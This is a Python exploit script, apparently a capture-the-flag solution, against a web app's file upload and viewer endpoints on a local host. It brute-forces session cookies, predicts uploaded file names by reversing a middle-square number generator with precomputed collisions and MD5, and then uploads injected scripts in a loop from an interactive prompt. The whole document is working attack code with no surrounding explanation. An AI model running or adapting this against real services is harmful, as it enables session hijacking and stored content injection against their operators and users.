from hashlib import md5

import http.cookiejar as cj
import readline
import requests
import time

# EDIT THIS FOR YOUR PURPOSE
DOMAIN = "localhost.local"
HOST = "localhost"
PORT = "2727"

URL = f"http://{HOST}:{PORT}"
UPLOAD_URL = URL + "/upload"
VIEWER_URL = URL + "/viewer"

BODY = """------Inject
Content-Disposition: form-data; name=\"file\"; filename=\"random\"
Content-Type: application/octet-stream

{content}
------Inject--
"""

COLLIDE = [0, 42560000, 45760000, 34560000, 31360000, 69760000, 5760000, 26560000,
    39360000, 21760000, 40960000, 89760000, 94410000, 38410000, 87210000, 53610000, 43360000,
    8810000, 84010000, 44010000, 810000, 6250000, 85610000, 56810000, 82410000, 36160000,
    77610000, 26410000, 72810000, 21610000, 16810000, 68010000, 68160000, 14410000, 12010000,
    9610000, 7210000, 58410000, 7360000, 58560000, 4810000, 2410000, 94560000, 97760000, 95210000,
    41760000, 41610000, 39210000, 43210000, 32010000, 83210000, 80810000, 29610000, 27210000, 27360000,
    78560000, 24810000, 76010000, 22560000, 20010000, 20160000, 17760000, 49760000, 19360000, 65760000,
    64160000, 73760000, 160000, 76960000, 51360000, 16160000, 62560000, 66410000, 12810000, 12960000,
    64010000, 80010000, 10000, 46410000, 56010000, 59210000, 33610000, 3210000, 88010000, 24010000,
    6410000, 61760000, 3360000, 52010000, 960000, 49610000, 47360000, 98560000, 47210000, 96010000,
    93760000, 40160000, 37760000, 88810000, 86410000, 86560000, 35360000, 35210000, 84160000, 30410000,
    28010000, 25760000, 25610000, 23210000, 74410000, 92160000, 72160000, 64810000, 13610000, 13760000,
    36010000, 62410000, 60010000, 60160000, 4010000, 55210000, 4160000, 1760000, 1610000, 50410000, 99210000
]

def get_number_files(html):
    p_tmp = html.find(" of 110 file uploaded")
    html = html[:p_tmp]
    p_tmp = html.rfind(">") + 1
    return int(html[p_tmp:])

def next_number(bef, n):
    tmp = int(bef ** 2 / 10 ** (n >> 1))
    ret = tmp % (10 ** n)
    return ret

def check_file(f, cookie, n):
    try:
        resp = requests.get(VIEWER_URL, cookies = cookie, params={"file": f})
        html = resp.text 
        pos_s = html.find("<pre>")
        pos_e = html.find("</pre>")
        content = int(html[pos_s + 5:pos_e])
        if content == n:
            return True
        else:
            return False
    except:
        return False

def upload(cookie, content):
    body = BODY.format(content = content)
    HEADER = {"Content-Type": "multipart/form-data; boundary=----Inject", "Accept": "*/*", "Content-Length": str(len(body))}
    resp = requests.post(UPLOAD_URL, cookies = cookie, data = body, headers = HEADER)
    return resp.cookies

def injection(cookie, num):
    last_collide = None

    print("[*] Find last uploaded file name...", end="", flush=True)
    for c in COLLIDE[:3]:
        fname = md5(str(c).encode()).hexdigest()
        if check_file(fname, cookie, num):
            last_collide = c
            print("FOUND", flush=True)
            break

    if last_collide == None:
        print("FAILED", flush=True)
        exit(-1)

    upload(cookie, "injection code")

    next_fname = md5(str(next_number(last_collide, 8)).encode()).hexdigest()
    print("\n[!] Let\'s start injecting!!!", flush=True)
    print(f"[+] Session: {cookie['session']}", flush=True)
    print(f"[+] You can access injection code here: {VIEWER_URL}?file={next_fname}", flush=True)
    try:
        while 1:
            script = input("script> ")
            upload(cookie, script)
    except KeyboardInterrupt:
        print()
        exit(0)

def bruteforce():
    # Get session id
    print("[*] Retrieve user cookies...", end="", flush=True)
    user_cookies = list()
    for i in range(100): # For worstcase, set to 270
        resp = requests.get(URL)
        user_cookies.append(resp.cookies)
        time.sleep(1)
    print("DONE", flush=True)

    for j in range(len(user_cookies)):
        usr_cookie = user_cookies[j]
        print(f"[*] Trying cookie {j}...", end="", flush=True)

        for i in range(2, 111):
            usr_cookie = upload(usr_cookie, str(i))
            resp = requests.get(URL, cookies = usr_cookie)

            if get_number_files(resp.text) != i:
                print("FOUND\n", flush=True)
                injection(usr_cookie, i)

        print("FAILED", flush=True)


if __name__ == "__main__":
    isCookie = input("Do you have session id? [Y/n]: ")
    if isCookie in ['Y', 'y']:
        session = input("Enter you session id: ")
        mycookie = requests.cookies.create_cookie(domain=DOMAIN,name='session',value=session)
        cookieJar = cj.CookieJar()
        cookieJar.set_cookie(mycookie)
        
        print("\n[!] Let\'s start injecting!!!", flush=True)
        try:
            while 1:
                script = input("script> ")
                upload(cookieJar, script)
        except KeyboardInterrupt:
            print()
            exit(0)
    else:
        bruteforce()